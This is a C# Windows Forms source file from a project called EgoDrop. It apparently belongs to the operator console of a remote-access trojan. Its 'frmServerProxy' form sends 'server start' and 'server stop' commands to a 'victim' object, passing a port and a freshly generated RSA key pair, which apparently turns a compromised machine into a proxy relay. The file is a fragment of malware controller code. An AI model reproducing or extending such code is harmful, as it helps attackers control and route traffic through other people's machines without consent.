using EgoDrop.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmServerProxy : Form
    {
        private clsVictim m_victim { get; init; }

        public frmServerProxy(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void frmServerProxy_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            clsCrypto crypto = new clsCrypto(true);
            m_victim.fnSendCommand(new string[]
            {
                "server",
                "start",
                ((int)numericUpDown1.Value).ToString(),
                Convert.ToBase64String(crypto.m_abRSAKeyPair.abPublicKey),
                Convert.ToBase64String(crypto.m_abRSAKeyPair.abPrivateKey),
            });
        }

        private void button2_Click(object sender, EventArgs e)
        {
            m_victim.fnSendCommand(new string[]
            {
                "server",
                "stop",
            });
        }
    }
}
